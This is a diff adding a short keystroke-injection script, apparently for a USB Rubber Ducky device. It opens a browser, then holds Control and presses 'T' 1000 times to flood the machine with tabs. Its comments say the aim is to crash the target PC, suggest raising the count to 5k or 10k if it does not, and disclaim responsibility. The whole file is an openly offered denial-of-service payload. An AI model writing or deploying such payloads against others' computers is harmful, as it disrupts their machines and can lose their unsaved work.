@@ -1,0 +1,16 @@
+REM ## This wil crash your pc with tabs (hopefully) ##
+REM ## I am not responsible for any harm you may do with this code ##
+
+GUI
+
+STRING google.com
+
+ENTER
+
+REM ## INITIATE DEATH SEQUENCE ##
+HOLD CONTROL
+
+STRING t
+
+REM ## If this does not crash the pc, make the number higher like 5k or 10k. ##
+REPEAT 1000
